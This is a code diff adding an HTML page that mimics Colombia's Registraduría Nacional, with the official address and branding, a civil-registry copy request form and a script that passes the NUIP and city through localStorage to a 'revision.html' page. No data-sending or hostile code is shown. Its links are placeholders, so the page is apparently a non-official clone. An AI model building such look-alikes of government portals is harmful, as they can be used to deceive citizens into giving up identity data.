@@ -1,0 +1,885 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Consultar - Registraduría Nacional</title>
+    <style>
+        /* Variables de color */
+        :root {
+            --bg-global: #EAF8F8; 
+            --bg-white: #FFFFFF;  
+            --text-blue: #1B365D; 
+            --text-gray: #666666;
+            --btn-blue: #002A54;  
+            --footer-dark: #002244; 
+            --footer-cyan: #00E5FF; 
+            --border-color: #CCCCCC;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-global);
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        /* --- HEADER FLOTANTE --- */
+        .header-floating-card {
+            background-color: var(--bg-white);
+            width: 100%;
+            max-width: 900px; 
+            border-radius: 25px;
+            padding: 20px 40px;
+            display: flex;
+            justify-content: flex-start;
+            align-items: center;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.03);
+            margin: 0 auto 20px auto;
+        }
+
+        .header-floating-card img {
+            max-width: 180px; 
+            height: auto;
+        }
+
+        /* --- SALUDO --- */
+        .welcome-section {
+            width: 100%;
+            max-width: 900px; 
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start; 
+            gap: 5px;
+            margin-bottom: 20px; 
+            padding-left: 10px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .greeting {
+            color: var(--text-gray);
+            font-size: 18px;
+            font-weight: 400;
+        }
+
+        .highlight-text {
+            color: var(--text-blue);
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 5px;
+        }
+
+        .process-text {
+            color: var(--text-gray); 
+            font-size: 15px;
+            margin-top: 5px;
+        }
+
+        /* --- TARJETA CENTRAL --- */
+        .card {
+            background-color: var(--bg-white);
+            width: 100%;
+            max-width: 900px; 
+            border-radius: 25px;
+            padding: 40px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.04);
+            text-align: left;
+            margin: 0 auto 30px auto;
+            flex: 1;
+        }
+
+        .card h2 {
+            color: var(--text-blue);
+            font-size: 22px;
+            font-weight: 600;
+            margin-bottom: 25px;
+        }
+
+        /* Caja interna del trámite */
+        .tramite-box {
+            border: 1px solid #D1D1D1;
+            border-radius: 20px;
+            padding: 30px;
+            display: flex;
+            align-items: center; 
+            gap: 20px; 
+        }
+
+        /* Icono circular azul */
+        .icon-circle {
+            background-color: #002A54;
+            width: 70px;
+            height: 70px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+
+        .icon-circle svg {
+            width: 32px;
+            height: 32px;
+            fill: none;
+            stroke: #00E5FF;
+            stroke-width: 2;
+            stroke-linecap: round;
+            stroke-linejoin: round;
+        }
+
+        /* Contenedor del texto y botón */
+        .tramite-info {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start; 
+            gap: 15px; 
+        }
+
+        .tramite-info h3 {
+            color: var(--text-blue);
+            font-size: 20px;
+            font-weight: 600;
+            margin: 0;
+        }
+
+        /* Botón con borde azul */
+        .btn-solicitar {
+            background-color: transparent;
+            color: var(--text-blue);
+            border: 2px solid var(--text-blue);
+            border-radius: 25px;
+            padding: 8px 25px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-decoration: none;
+            display: inline-block;
+        }
+
+        .btn-solicitar:hover {
+            background-color: var(--text-blue);
+            color: white;
+        }
+
+        /* --- FOOTER --- */
+        .footer {
+            background-color: var(--footer-dark);
+            color: white;
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            margin-top: auto;
+        }
+
+        .footer-main {
+            display: flex;
+            flex-direction: row;
+            justify-content: space-between;
+            padding: 40px 5%;
+            max-width: 1400px;
+            margin: 0 auto;
+            width: 100%;
+            gap: 30px;
+        }
+
+        .footer-brand {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            max-width: 250px;
+        }
+
+        .footer-brand img {
+            max-width: 150px;
+            margin-bottom: 15px;
+        }
+
+        .footer-columns {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 40px;
+            flex: 1;
+            justify-content: space-between;
+        }
+
+        .footer-col {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+
+        .footer-col p {
+            margin: 0;
+            max-width: 300px;
+        }
+
+        .footer-col a {
+            color: white;
+            text-decoration: none;
+        }
+
+        .footer-col a:hover {
+            text-decoration: underline;
+        }
+
+        .footer-bottom-strip {
+            background-color: var(--footer-cyan);
+            color: var(--footer-dark);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 5%;
+            font-weight: 600;
+            font-size: 14px;
+        }
+
+        .footer-bottom-item {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .footer-bottom-item svg {
+            width: 24px;
+            height: 24px;
+            fill: var(--footer-dark);
+        }
+
+        /* --- ESTILOS DEL MODAL --- */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(27, 54, 93, 0.4); 
+            backdrop-filter: blur(8px); 
+            -webkit-backdrop-filter: blur(8px);
+            display: none; 
+            justify-content: center;
+            align-items: flex-start; 
+            z-index: 1000; 
+            overflow-y: auto; 
+            padding: 20px; 
+        }
+
+        .modal-content {
+            background-color: var(--bg-white);
+            width: 100%;
+            max-width: 800px;
+            border-radius: 20px;
+            padding: 40px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+            position: relative;
+            margin: 40px auto; 
+        }
+
+        .modal-content h1 {
+            color: var(--text-blue);
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 10px;
+        }
+
+        .modal-content p.subtitle {
+            color: var(--text-gray);
+            font-size: 16px;
+            margin-bottom: 30px;
+        }
+
+        /* Grid del formulario */
+        .form-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+            margin-bottom: 10px;
+        }
+
+        .form-group {
+            display: flex;
+            flex-direction: column;
+            position: relative;
+        }
+
+        .form-group label {
+            position: absolute;
+            top: -8px;
+            left: 15px;
+            background-color: white;
+            padding: 0 5px;
+            font-size: 12px;
+            color: var(--text-gray);
+            font-weight: 500;
+            z-index: 1;
+        }
+
+        .form-control {
+            width: 100%;
+            padding: 15px;
+            border: 1px solid var(--border-color);
+            border-radius: 10px;
+            font-size: 15px;
+            color: var(--text-blue);
+            outline: none;
+            transition: border-color 0.3s;
+            background-color: white;
+        }
+
+        .form-control:focus {
+            border-color: var(--text-blue);
+        }
+
+        /* ESTILO DEL SELECT TRADICIONAL */
+        select.form-control {
+            appearance: none;
+            -webkit-appearance: none;
+            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%23666' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");
+            background-repeat: no-repeat;
+            background-position: right 15px center;
+            background-size: 15px;
+            cursor: pointer;
+        }
+
+        .section-title {
+            color: var(--text-blue);
+            font-size: 16px;
+            font-weight: 600;
+            margin-top: 15px;
+            margin-bottom: 15px;
+            grid-column: 1 / -1;
+            border-bottom: 1px solid #EEEEEE;
+            padding-bottom: 5px;
+        }
+
+        /* Botones del modal */
+        .form-footer {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-top: 1px solid #EEEEEE;
+            padding-top: 25px;
+            margin-top: 20px;
+            flex-wrap: wrap;
+            gap: 15px;
+        }
+
+        .footer-link {
+            font-size: 14px;
+            color: var(--text-gray);
+        }
+
+        .footer-link a {
+            color: #0056b3;
+            font-weight: bold;
+            text-decoration: none;
+        }
+
+        .footer-link a:hover {
+            text-decoration: underline;
+        }
+
+        .action-buttons {
+            display: flex;
+            gap: 15px;
+            align-items: center;
+        }
+
+        .btn-cancel {
+            background: transparent;
+            color: #D32F2F;
+            border: none;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            text-decoration: none;
+        }
+        
+        .btn-cancel:hover {
+            text-decoration: underline;
+        }
+
+        .btn-submit {
+            background-color: var(--btn-blue);
+            color: white;
+            border: none;
+            border-radius: 25px;
+            padding: 12px 30px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            text-decoration: none;
+            display: inline-block;
+        }
+
+        .btn-submit:hover {
+            background-color: #001F3F;
+            color: white;
+        }
+
+        /* Adaptación para Móvil */
+        @media (max-width: 768px) {
+            .header-floating-card {
+                justify-content: flex-start;
+                padding-left: 20px;
+            }
+            
+            .header-floating-card img {
+                max-width: 140px; 
+            }
+
+            .welcome-section {
+                align-items: flex-start;
+                text-align: left;
+            }
+            
+            .highlight-text {
+                font-size: 24px;
+            }
+
+            .card {
+                padding: 25px 20px;
+            }
+            
+            .tramite-box {
+                flex-direction: column; 
+                text-align: center;
+                padding: 20px;
+            }
+
+            .tramite-info {
+                align-items: center; 
+            }
+
+            .footer-main {
+                flex-direction: column;
+                align-items: center;
+                text-align: center;
+            }
+
+            .footer-columns {
+                flex-direction: column;
+                align-items: center;
+                gap: 20px;
+            }
+
+            .footer-bottom-strip {
+                flex-direction: column;
+                gap: 15px;
+            }
+
+            .modal-content {
+                padding: 25px 20px;
+                margin: 20px auto; 
+            }
+            .form-grid {
+                grid-template-columns: 1fr;
+            }
+            .form-footer {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+            .action-buttons {
+                width: 100%;
+                justify-content: flex-end;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="header-floating-card">
+        <img src="image.png" alt="Registraduría Nacional">
+    </div>
+
+    <div class="welcome-section">
+        <span class="greeting">Hola,</span>
+        <span class="highlight-text">¡Qué bueno verte!</span>
+        <p class="process-text">Revisa los procesos que tienes disponibles para realizar hoy.</p>
+    </div>
+
+    <div class="card">
+        
+        <h2>Qué tenemos hoy</h2>
+
+        <div class="tramite-box">
+            
+            <div class="icon-circle">
+                <svg viewBox="0 0 24 24">
+                    <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                    <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                </svg>
+            </div>
+
+            <div class="tramite-info">
+                <h3>Copia de registro civil</h3>
+                <button class="btn-solicitar" onclick="abrirModal()">Solicitar copia</button>
+            </div>
+
+        </div>
+    </div>
+
+    <footer class="footer">
+        <div class="footer-main">
+            <div class="footer-brand">
+                <img src="blanco.png" alt="Logo Registraduría">
+            </div>
+            <div class="footer-columns">
+                <div class="footer-col">
+                    <p>Av. Calle 26 n.° 51-50, CAN, Bogotá, Colombia. CP: 111321</p>
+                    <p>Horario de atención correspondencia de lunes a viernes de 8:00 a. m. a 4:30 p. m. en jornada continua (Sede CAN av. calle 26 n° 51-50)</p>
+                    <p>Conmutador: +57 (601) 220 2880</p>
+                </div>
+                <div class="footer-col">
+                    <a href="#">Políticas de privacidad</a>
+                    <a href="#">Correo institucional</a>
+                    <a href="#">Correo institucional (Office 365)</a>
+                </div>
+                <div class="footer-col">
+                    <a href="#">Mapa del sitio</a>
+                    <a href="#">Contáctenos</a>
+                    <a href="#">Biblioteca</a>
+                </div>
+                <div class="footer-col">
+                    <a href="#">Normativa</a>
+                    <a href="#">Correos judiciales</a>
+                    <a href="#">PQRSDC</a>
+                </div>
+            </div>
+        </div>
+        <div class="footer-bottom-strip">
+            <div class="footer-bottom-item">
+                <svg viewBox="0 0 24 24"><path d="M12 2L2 7v2h20V7L12 2zm0 2.5l6.5 3.2H5.5L12 4.5zM4 10v8H2v2h20v-2h-2v-8h-2v8h-4v-8h-2v8H8v-8H4zm0 2h2v6H4v-6zm14 0h2v6h-2v-6z"/></svg>
+                <span>Institucional</span>
+            </div>
+            <div class="footer-bottom-item">
+                <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
+                <span>Servicios a la ciudadanía</span>
+            </div>
+            <div class="footer-bottom-item">
+                <svg viewBox="0 0 24 24"><path d="M3 3v18h18V3H3zm16 16H5V5h14v14zM7 10h2v7H7v-7zm4-3h2v10h-2V7zm4 6h2v4h-2v-4z"/></svg>
+                <span>CEDAE (Datos para la democracia)</span>
+            </div>
+        </div>
+    </footer>
+
+    <!-- MODAL DEL FORMULARIO -->
+    <div class="modal-overlay" id="modalFormulario">
+        <div class="modal-content">
+            
+            <h1>Copia de registro civil</h1>
+            <p class="subtitle">Diligencia la información del documento que quieres tramitar.</p>
+
+            <form id="formTramite">
+                <div class="form-grid">
+                    
+                    <!-- SECCIÓN 1: DATOS DEL SOLICITANTE -->
+                    <div class="section-title">Datos del solicitante</div>
+                    
+                    <div class="form-group">
+                        <label>Primer nombre *</label>
+                        <input type="text" class="form-control" placeholder="Primer nombre" required>
+                    </div>
+                    <div class="form-group">
+                        <label>Segundo nombre (Opcional)</label>
+                        <input type="text" class="form-control" placeholder="Segundo nombre">
+                    </div>
+                    <div class="form-group">
+                        <label>Primer apellido *</label>
+                        <input type="text" class="form-control" placeholder="Primer apellido" required>
+                    </div>
+                    <div class="form-group">
+                        <label>Segundo apellido</label>
+                        <input type="text" class="form-control" placeholder="Segundo apellido">
+                    </div>
+
+                    <!-- SECCIÓN 2: INFORMACIÓN DEL REGISTRO -->
+                    <div class="section-title">Información de la persona inscrita</div>
+
+                    <div class="form-group">
+                        <label>Tipo de registro civil *</label>
+                        <select class="form-control" required>
+                            <option value="" disabled selected></option>
+                            <option value="nacimiento">Registro Civil de Nacimiento</option>
+                            <option value="matrimonio">Registro Civil de Matrimonio</option>
+                            <option value="defuncion">Registro Civil de Defunción</option>
+                        </select>
+                    </div>
+
+                    <div class="form-group">
+                        <label>Tipo de búsqueda *</label>
+                        <select class="form-control" required>
+                            <option value="" disabled selected></option>
+                            <option value="nuip">Por NUIP</option>
+                            <option value="serial">Por Número Serial</option>
+                        </select>
+                    </div>
+
+                    <div class="form-group">
+                        <label>Número de Identificación (NUIP) *</label>
+                        <input type="text" id="nuipConsultado" class="form-control" placeholder="Digite su número de NUIP" required readonly style="background-color: #F9F9F9;">
+                    </div>
+
+                    <!-- SELECT DE SITIO DE EXPEDICIÓN -->
+                    <div class="form-group">
+                        <label>Sitio de expedición *</label>
+                        <select class="form-control" id="selectCiudad" required>
+                            <option value="" disabled selected>Seleccione el lugar</option>
+                            
+                            <!-- Bogotá de primeras -->
+                            <option value="Bogotá D.C.">Bogotá D.C.</option>
+
+                            <!-- Departamentos -->
+                            <optgroup label="Amazonas">
+                                <option value="Leticia">Leticia</option>
+                                <option value="Puerto Nariño">Puerto Nariño</option>
+                                <option value="La Chorrera">La Chorrera</option>
+                                <option value="Tarapacá">Tarapacá</option>
+                            </optgroup>
+
+                            <optgroup label="Antioquia">
+                                <option value="Medellín">Medellín</option>
+                                <option value="Bello">Bello</option>
+                                <option value="Itagüí">Itagüí</option>
+                                <option value="Envigado">Envigado</option>
+                                <option value="Rionegro">Rionegro</option>
+                                <option value="Apartadó">Apartadó</option>
+                                <option value="Caucasia">Caucasia</option>
+                                <option value="Yarumal">Yarumal</option>
+                                <option value="Santa Fe de Antioquia">Santa Fe de Antioquia</option>
+                                <option value="Sonsón">Sonsón</option>
+                                <option value="San Pedro de los Milagros">San Pedro de los Milagros</option>
+                                <option value="El Bagre">El Bagre</option>
+                                <option value="Turbo">Turbo</option>
+                                <option value="Urrao">Urrao</option>
+                                <option value="San Carlos">San Carlos</option>
+                            </optgroup>
+
+                            <optgroup label="Atlántico">
+                                <option value="Barranquilla">Barranquilla</option>
+                                <option value="Soledad">Soledad</option>
+                                <option value="Malambo">Malambo</option>
+                                <option value="Sabanalarga">Sabanalarga</option>
+                                <option value="Puerto Colombia">Puerto Colombia</option>
+                                <option value="Baranoa">Baranoa</option>
+                                <option value="Campo de la Cruz">Campo de la Cruz</option>
+                            </optgroup>
+
+                            <optgroup label="Bolívar">
+                                <option value="Cartagena">Cartagena</option>
+                                <option value="Magangué">Magangué</option>
+                                <option value="El Carmen de Bolívar">El Carmen de Bolívar</option>
+                                <option value="Turbaco">Turbaco</option>
+                                <option value="Mompox">Mompox</option>
+                                <option value="San Juan Nepomuceno">San Juan Nepomuceno</option>
+                                <option value="Achí">Achí</option>
+                                <option value="Morales">Morales</option>
+                            </optgroup>
+
+                            <optgroup label="Boyacá">
+                                <option value="Tunja">Tunja</option>
+                                <option value="Duitama">Duitama</option>
+                                <option value="Sogamoso">Sogamoso</option>
+                                <option value="Chiquinquirá">Chiquinquirá</option>
+                                <option value="Paipa">Paipa</option>
+                                <option value="Puerto Boyacá">Puerto Boyacá</option>
+                                <option value="Villa de Leyva">Villa de Leyva</option>
+                                <option value="Moniquirá">Moniquirá</option>
+                                <option value="Samacá">Samacá</option>
+                            </optgroup>
+
+                            <optgroup label="Caldas">
+                                <option value="Manizales">Manizales</option>
+                                <option value="La Dorada">La Dorada</option>
+                                <option value="Chinchiná">Chinchiná</option>
+                                <option value="Riosucio">Riosucio</option>
+                                <option value="Aguadas">Aguadas</option>
+                                <option value="Salamina">Salamina</option>
+                            </optgroup>
+
+                            <optgroup label="Córdoba">
+                                <option value="Montería">Montería</option>
+                                <option value="Sahagún">Sahagún</option>
+                                <option value="Planeta Rica">Planeta Rica</option>
+                                <option value="Tierralta">Tierralta</option>
+                                <option value="Cereté">Cereté</option>
+                                <option value="Lorica">Lorica</option>
+                            </optgroup>
+
+                            <optgroup label="Cundinamarca">
+                                <option value="Soacha">Soacha</option>
+                                <option value="Chía">Chía</option>
+                                <option value="Zipaquirá">Zipaquirá</option>
+                                <option value="Facatativá">Facatativá</option>
+                                <option value="Fusagasugá">Fusagasugá</option>
+                                <option value="Girardot">Girardot</option>
+                                <option value="Madrid">Madrid</option>
+                                <option value="Mosquera">Mosquera</option>
+                                <option value="Cajicá">Cajicá</option>
+                                <option value="Funza">Funza</option>
+                                <option value="Sopó">Sopó</option>
+                                <option value="Ubaté">Ubaté</option>
+                                <option value="Guaduas">Guaduas</option>
+                                <option value="Pacho">Pacho</option>
+                                <option value="La Vega">La Vega</option>
+                            </optgroup>
+
+                            <optgroup label="Huila">
+                                <option value="Neiva">Neiva</option>
+                                <option value="Pitalito">Pitalito</option>
+                                <option value="Garzón">Garzón</option>
+                                <option value="La Plata">La Plata</option>
+                                <option value="San Agustín">San Agustín</option>
+                            </optgroup>
+
+                            <optgroup label="Magdalena">
+                                <option value="Santa Marta">Santa Marta</option>
+                                <option value="Ciénaga">Ciénaga</option>
+                                <option value="Fundación">Fundación</option>
+                                <option value="Plato">Plato</option>
+                                <option value="El Banco">El Banco</option>
+                                <option value="Pivijay">Pivijay</option>
+                                <option value="Aracataca">Aracataca</option>
+                            </optgroup>
+
+                            <optgroup label="Meta">
+                                <option value="Villavicencio">Villavicencio</option>
+                                <option value="Acacías">Acacías</option>
+                                <option value="Granada">Granada</option>
+                                <option value="Puerto Gaitán">Puerto Gaitán</option>
+                                <option value="San Martín">San Martín</option>
+                            </optgroup>
+
+                            <optgroup label="Nariño">
+                                <option value="Pasto">Pasto</option>
+                                <option value="Ipiales">Ipiales</option>
+                                <option value="Tumaco">Tumaco</option>
+                                <option value="Túquerres">Túquerres</option>
+                                <option value="La Unión">La Unión</option>
+                            </optgroup>
+
+                            <optgroup label="Norte de Santander">
+                                <option value="Cúcuta">Cúcuta</option>
+                                <option value="Ocaña">Ocaña</option>
+                                <option value="Pamplona">Pamplona</option>
+                                <option value="Los Patios">Los Patios</option>
+                                <option value="Villa del Rosario">Villa del Rosario</option>
+                                <option value="Tibú">Tibú</option>
+                            </optgroup>
+
+                            <optgroup label="Quindío">
+                                <option value="Armenia">Armenia</option>
+                                <option value="Calarcá">Calarcá</option>
+                                <option value="Circasia">Circasia</option>
+                                <option value="Montenegro">Montenegro</option>
+                                <option value="Quimbaya">Quimbaya</option>
+                            </optgroup>
+
+                            <optgroup label="Risaralda">
+                                <option value="Pereira">Pereira</option>
+                                <option value="Dosquebradas">Dosquebradas</option>
+                                <option value="Santa Rosa de Cabal">Santa Rosa de Cabal</option>
+                                <option value="La Virginia">La Virginia</option>
+                            </optgroup>
+
+                            <optgroup label="Santander">
+                                <option value="Bucaramanga">Bucaramanga</option>
+                                <option value="Barrancabermeja">Barrancabermeja</option>
+                                <option value="Floridablanca">Floridablanca</option>
+                                <option value="Girón">Girón</option>
+                                <option value="Barbosa">Barbosa</option>
+                                <option value="San Gil">San Gil</option>
+                                <option value="Socorro">Socorro</option>
+                            </optgroup>
+
+                            <optgroup label="Valle del Cauca">
+                                <option value="Cali">Cali</option>
+                                <option value="Buenaventura">Buenaventura</option>
+                                <option value="Palmira">Palmira</option>
+                                <option value="Tuluá">Tuluá</option>
+                                <option value="Jamundí">Jamundí</option>
+                                <option value="Cartago">Cartago</option>
+                                <option value="Yumbo">Yumbo</option>
+                                <option value="Buga">Buga</option>
+                                <option value="Sevilla">Sevilla</option>
+                                <option value="Roldanillo">Roldanillo</option>
+                                <option value="Zarzal">Zarzal</option>
+                            </optgroup>
+                            
+                        </select>
+                    </div>
+
+                </div>
+
+                <div class="form-footer">
+                    <div class="footer-link">
+                        ¿No conoces el Número serial? <a href="#">consulta Aquí</a>
+                    </div>
+                    
+                    <div class="action-buttons">
+                        <button type="button" class="btn-cancel" onclick="cerrarModal()">Cancelar</button>
+                        <button type="submit" class="btn-submit">Siguiente</button>
+                    </div>
+                </div>
+            </form>
+
+        </div>
+    </div>
+
+    <script>
+        // 1. Cargar NUIP desde localStorage
+        document.addEventListener("DOMContentLoaded", function() {
+            const nuipGuardado = localStorage.getItem('nuipConsultado');
+            const inputNuip = document.getElementById('nuipConsultado');
+            
+            if (nuipGuardado) {
+                inputNuip.value = nuipGuardado;
+            } else {
+                inputNuip.removeAttribute('readonly');
+                inputNuip.style.backgroundColor = 'white';
+            }
+
+            const urlParams = new URLSearchParams(window.location.search);
+            if (urlParams.get('abrir') === 'true') {
+                abrirModal();
+            }
+        });
+
+        // 2. Abrir y cerrar el modal
+        function abrirModal() {
+            document.getElementById('modalFormulario').style.display = 'flex';
+            document.body.style.overflow = 'hidden'; 
+        }
+
+        function cerrarModal() {
+            document.getElementById('modalFormulario').style.display = 'none';
+            document.body.style.overflow = 'auto'; 
+        }
+
+        // 3. Al enviar el formulario, guardar ciudad y pasar a revision.html
+        document.getElementById('formTramite').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const select = document.getElementById('selectCiudad');
+            const ciudadTexto = select.options[select.selectedIndex].text;
+            
+            localStorage.setItem('ciudadExpedicion', ciudadTexto);
+            
+            // CORREGIDO: Ahora redirige a revision.html
+            window.location.href = 'revision.html'; 
+        });
+    </script>
+</body>
+</html>
